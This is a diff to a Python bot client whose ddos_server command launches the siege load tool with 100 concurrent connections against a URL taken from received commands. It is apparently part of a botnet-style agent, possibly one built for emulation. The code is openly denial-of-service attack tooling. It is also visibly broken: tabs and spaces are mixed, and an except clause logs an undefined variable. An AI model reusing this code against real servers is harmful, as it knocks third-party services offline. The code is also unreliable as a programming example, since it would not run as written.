@@ -21,23 +21,22 @@ class BotCommands(object):
         """Echos its parameters back"""
         logging.info("default_command: %s" % kwargs)
 
-    def ddos_server(self, url=None, ip=None, timeout=30):
-        if self.ddos_process is None or not self.ddos_process.poll():
-            if self.ddos_process is not None:
-                logging.debug("siege: %s" % self.ddos_process.communicate())
+    def ddos_server(self, url, timeout=30):
+	if self.ddos_process is not None:
+	    logging.debug("communicate with siege")
+	    stdout,stderr = self.ddos_process.communicate()
+            logging.debug("siege stdout: %s"%stdout)
+	    logging.debug("siege stderr: %s"%stderr)
 
-            if url is not None and validators.url(url):
-                cmdstr = "siege -c 100 -t %ds %s "%(timeout + 2, timeout, url)
-                logging.debug(cmdstr)
-                ddos_process = subprocess.Popen(shlex.split(cmdstr))
-            elif ip is not None and validators.ipv4(ip) or validators.ipv6(ip):
-                # TODO: DDOS eine IP
-                pass
-            else:
-                logging.warning("Neither ip nor url where supplied, DDOS failed")
-                logging.debug("isurl: %s, isip: %s"%(validators.url(str(url)), validators.ipv4(str(url)) or validators.ipv6(ip)))
+        if url is not None and validators.url(url):
+	    cmdstr = "timeout -k {longerTimeout}s {longerTimeout}s siege -c 100 -t {timeout} {url}"\
+		.format(longerTimeout=timeout+2, timeout=timeout, url=url)
+            logging.debug(cmdstr)
+            self.ddos_process = subprocess.Popen(shlex.split(cmdstr))
         else:
-            logging.debug("siege is still running")
+            logging.warning("Neither ip nor url where supplied, DDOS failed")
+            logging.debug("validators.url(%s) == %s"%(url, validators.url(str(url))))
+
 
 cmdobject = BotCommands()
 
@@ -73,7 +72,7 @@ def executeCurrentCommand(command):
         retval = methodToCall(cmdobject, **command["kwargs"])
         return retval
     except TypeError:
-        logging.warning("Command %s got invalid parameters: %s"%(command["command"], command["kwargs"]))
+	logging.warning("Command %s(**%s) could not be executed: %s"%(command["command"], command["kwargs"], ex))
 
 if __name__ == '__main__':
     logging.basicConfig(**emu_config.logging_config)
